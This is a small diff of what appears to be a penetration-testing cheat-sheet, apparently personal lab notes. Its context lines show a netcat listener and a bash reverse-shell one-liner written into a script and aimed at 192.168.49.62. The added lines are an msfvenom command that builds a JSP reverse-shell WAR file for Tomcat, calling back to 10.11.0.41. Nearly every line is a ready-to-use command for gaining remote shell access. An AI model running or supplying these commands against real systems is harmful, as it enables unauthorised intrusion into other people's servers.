@@ -107,6 +107,11 @@ nc -lvnp PORT
 
 #shell dentro file.sh
 echo "bash -c 'bash -i >& /dev/tcp/192.168.49.62/80  0>&1'" > write.sh
+
+
+#TomcatReverse
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
+
 ```
 
 ---
